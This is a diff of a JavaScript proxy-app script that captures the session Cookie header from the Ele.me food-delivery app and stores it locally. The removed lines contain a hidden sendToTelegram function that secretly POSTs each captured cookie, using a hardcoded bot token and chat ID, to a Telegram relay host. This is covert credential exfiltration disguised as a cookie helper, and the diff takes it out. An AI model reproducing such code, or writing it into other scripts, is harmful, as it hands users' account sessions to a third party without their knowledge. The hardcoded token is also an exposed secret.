@@ -33,43 +33,12 @@ const $ = new Env("饿了么Cookie");
 if ($request && $request.headers) {
     const cookie = $request.headers['Cookie'];
     if (cookie && !$.data['elmck']) {
+        // 保存Cookie到本地
         $.setdata(cookie, 'elmck');
-        sendToTelegram(cookie);
-    } else {
-        $.msg("饿了么", "Cookie 已存在", "不再重复获取");
+        $notify('Quantumult X', 'elmCK获取成功', `${cookie}`);
+        $done({});
+        return; // 结束脚本，避免重复获取
     }
 }
 
-$.done();
-
-function sendToTelegram(cookie) {
-    const token = '2130659069:AAGUqK6kx97P07MMzf14pOZAiRSisdR9-EI';
-    const chatId = '1817565003';
-    const url = `https://tg1.dinding.eu.org/bot${token}/sendMessage`;
-
-    const message = {
-        chat_id: chatId,
-        text: `${cookie}`
-    };
-
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', url, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                $.msg("饿了么", "Cookie 已发送到 Telegram", cookie);
-            } else {
-                $.msg("饿了么", "发送失败", xhr.responseText);
-            }
-        }
-    };
-
-    xhr.onerror = function () {
-        $.msg("饿了么", "请求错误", "无法连接到 Telegram");
-    };
-
-    xhr.send(JSON.stringify(message));
-}
-
+$done({});
